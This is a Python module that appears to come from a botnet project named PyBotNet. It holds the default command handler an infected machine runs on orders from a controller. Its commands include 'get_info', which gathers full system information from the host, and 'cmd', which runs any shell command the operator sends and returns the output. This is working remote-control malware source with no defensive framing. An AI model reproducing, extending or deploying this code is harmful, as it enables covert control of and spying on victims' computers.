'''Defult PyBotNet scripts'''

from time import sleep
from subprocess import check_output

# pybotnet import
import util

scripts_name = {
    "do_sleep": 'do_sleep <scconds> <message>',
    "get_info": 'get_info',
    "cmd": 'cmd <command>'
}


def get_command_name(command) -> str:
    return command.split(' ')[0]


def split_command(command) -> list:
    return command.split(' ')


def is_command(command) -> bool:
    command_name = get_command_name(command)
    if command_name in scripts_name:
        return True
    return False


def execute_scripts(command, pybotnet_up_time, logger):
    command_name = get_command_name(command)

    if is_command(command):
        if command_name == 'do_sleep':
            return execute_do_sleep(command, logger)

        elif command_name == 'get_info':
            return get_info(pybotnet_up_time, logger)

        elif command_name == 'cmd':
            return execute_cmd(command, logger)

    logger.error('invalid command; Wrong format')
    return 'invalid command; Wrong format'


def execute_do_sleep(command, logger):
    comm = split_command(command)
    try:
        sleep_message = comm[2]
    except:
        sleep_message = ''

    try:
        do_sleep(seconds=comm[1], logger=logger, sleep_message=sleep_message)
        logger.info('do_sleep done')
        return 'do_sleep done'
    except:
        logger.error('execute_do_sleep invalid command; Wrong format')
        return 'execute_do_sleep invalid command; Wrong format'


def do_sleep(seconds, logger, sleep_message=''):
    '''
    print sleep message and sleep
    '''
    if sleep_message != 'none':
        print(sleep_message)

    logger.info(f'sleep {seconds} second | {sleep_message}')
    sleep(float(seconds))
    logger.info('sleep done')


def get_info(pybotnet_up_time, logger):
    logger.info('return system info')
    return util.get_full_system_info(pybotnet_up_time)


def execute_cmd(command, logger) -> str:
    try:
        command = split_command(command)
        command = command[1:]
    except:
        return 'execute_cmd invalid command; Wrong format'

    try:
        return cmd(command, logger=logger)
    except:
        return 'cmd error'


def cmd(cmd,  logger) -> str:
    logger.info(f'try to run: {cmd}')

    output = check_output(cmd, shell=True)
    return str(output).replace('\\r\\n', '\n')  # cleaning data

    # TODO: add timeout
